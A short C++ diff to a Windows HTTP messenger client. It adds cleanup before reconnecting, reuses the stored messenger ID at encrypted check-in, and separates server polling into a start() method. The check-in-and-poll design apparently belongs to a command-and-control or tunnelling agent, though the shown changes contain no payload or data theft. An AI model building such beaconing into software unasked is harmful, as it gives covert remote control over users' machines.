@@ -153,6 +153,9 @@ std::vector<uint8_t> HTTPMessengerClient::post_binary(const std::vector<uint8_t>
 }
 
 void HTTPMessengerClient::connect() {
+    // Clean up any previous connection state
+    cleanup();
+
     std::cout << "[HTTP] Connecting to " << (use_ssl_ ? "https" : "http") << "://"
               << host_ << ":" << port_ << path_ << std::endl;
 
@@ -174,8 +177,8 @@ void HTTPMessengerClient::connect() {
         throw std::runtime_error("WinHttpConnect failed: " + std::to_string(GetLastError()));
     }
 
-    // Initial check-in
-    auto check_in = CheckInMessage{""};
+    // Check-in with existing messenger_id (empty on first connect)
+    auto check_in = CheckInMessage{messenger_id_};
     std::vector<Message> msgs = {Message{check_in}};
     auto payload = serialize_messages(encryption_key_, msgs);
 
@@ -195,7 +198,9 @@ void HTTPMessengerClient::connect() {
 
     messenger_id_ = check_in_response->messenger_id;
     std::cout << "[+] Connected to server with Messenger ID: " << messenger_id_ << std::endl;
+}
 
+void HTTPMessengerClient::start() {
     poll_server();
 }
 
